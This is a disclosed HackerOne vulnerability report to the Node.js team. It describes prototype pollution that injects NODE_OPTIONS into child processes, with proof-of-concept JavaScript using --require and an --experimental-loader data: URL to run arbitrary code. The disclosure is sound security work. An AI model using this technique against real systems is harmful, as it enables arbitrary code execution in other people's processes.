# Child process environment injection via prototype pollution

## Report Details
- **Report ID**: 878181
- **URL**: https://hackerone.com/reports/878181
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-05-19T17:00:54.691Z
- **Disclosed**: 2020-07-04T10:06:21.969Z

## Reporter
- **Username**: coreyfarrell
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** prototype pollution causes polluted system environment for child processes.

**Description:** This can be used to inject arbitrary `--require` flags to node.js child processes or in the case of current node.js versions it can be used to inject arbitrary JavaScript to child processes.

In practice this would require exploiting an existing prototype pollution vulnerability, https://www.npmjs.com/advisories/1164 for example could allow remote attack if an untrusted handlebars template were processed before spawning child processes.

## Steps To Reproduce:

The following code demonstrates that prototype injection is reflected in the environment of `child_process` spawns.

```js
'use strict';

const {spawnSync} = require('child_process');

// Prototype injection entered directly here for demonstration purposes, normally would be
// accomplished by exploiting a vulnerable npm module, https://www.npmjs.com/advisories/1164
// for example.
({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js';

// This will execute `./malicious-code.js` before running `subprocess.js`
console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());

// Current versions of node.js can run arbitrary code without needing the malicious-code.js
// to be on the destination file system:
({}).__proto__.NODE_OPTIONS = `--experimental-loader="data:text/javascript,console.log('injection');"`;

// The child process will print `injection` before running subprocess.js
console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());
```

Creating this script along with a `subprocess.js` and `malicious-code.js` that each perform a `console.log` will demonstrate the effectiveness of this prototype pollution.

## Impact

Successful prototype injection on version of node.js which supports `--experimental-loader` can run any JavaScript code in child processes.  Older versions of node.js can only be caused to run arbitrary code that is on the local file system.

This could also be used as a DoS attack if NODE_OPTIONS were set to `--bad-flag`.

## Attachments
No attachments
